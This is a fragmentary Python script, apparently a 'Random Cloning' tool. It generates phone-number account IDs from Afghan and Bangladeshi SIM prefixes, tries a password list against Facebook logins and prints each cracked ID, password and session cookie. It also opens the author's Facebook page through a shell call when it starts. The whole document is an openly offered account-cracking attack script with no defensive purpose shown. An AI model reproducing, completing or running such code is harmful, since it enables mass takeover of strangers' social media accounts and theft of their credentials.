...
def jalan(z):
    for e in z + '\n':
        ...
        sys.stdout.flush()
        time.sleep(0.03)
os.system("xdg-open https://www.facebook.com/ITZ.H4B1B.V4U?ref=share")
...
\033[1;36m##     ##       ##  ########  #### ########  
\033[1;37m=================================================
\033[1;33mAuthor      :  H4BIB AHMED
\033[1;32mWhats App   : +8801300869875
\033[1;36mFace Book   : https://www.facebook.com/ITZ.H4B1B.V4U
\033[1;31mGithub      : https://github.com/habibahmed143
\033[1;37mPublic Gc   : Ideal Cyber Crime help line
\033[1;34mStatus      : Free
\033[1;35mVersion     : 0.0.1
\033[1;33mTooles Name : Random Clooning
\033[1;37m=================================================
"""
BLUE = '\033[1;32m'
...
def random_number():
    ...
    print('\033[1;32m[+]==============================================')
    print('\033[1;94m[√] AFGHAN SIM CODE : 👇')
    print('\033[1;32m[~] \033[1;32m9370,9371,9372,9377 ETC...\033[0;97m')
    print('\033[1;32m[+]==============================================')
    print('\033[1;95m[√] BANGLA SIM CODE : 👇')   
    print('\033[1;32m[~] \033[1;32m0130,0140,0150 ETC...\033[0;92m')
    print(49*'=')
    kode = input('[+]\033[1;36m Enter Your Country Code: ')
    limit = int(input('How many ids do you want to cruck ? '))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;92m[H4B1B-OK💚] '+cid+' | '+ps+'\n[•] Useeagent: '+ua+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;95m[H4B1B-CP💔] '+cid+' | '+ps+'\033[0;97m')
                cek_apk(session,coki)
                ...
                continue
        loop+=1
        sys.stdout.write('\r  H4B1B💚/💔[%s/%s]  OK:-%s  CP:-%s \r'%(loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
main()
